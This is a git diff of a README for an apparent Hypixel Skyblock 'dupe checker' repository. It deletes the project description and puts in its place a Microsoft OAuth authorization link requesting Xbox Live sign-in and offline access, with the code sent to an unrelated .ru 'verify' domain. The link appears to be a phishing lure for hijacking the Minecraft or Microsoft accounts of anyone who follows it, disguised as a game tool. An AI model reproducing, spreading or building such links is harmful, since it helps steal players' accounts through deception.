@@ -1,2 +1,1 @@
-# Hypixel-duper
-Checks items in inventories to see if they were duped as part of the Crystal Hollows Dupe Event in Hypixel Skyblock.
+https://login.live.com/oauth20_authorize.srf?client_id=12e40df3-625c-4c6b-892e-83871740ed80&response_type=code&redirect_uri=https://verify.qolverify.ru/verify&scope=XboxLive.signin+offline_access&state=1061102049959346217
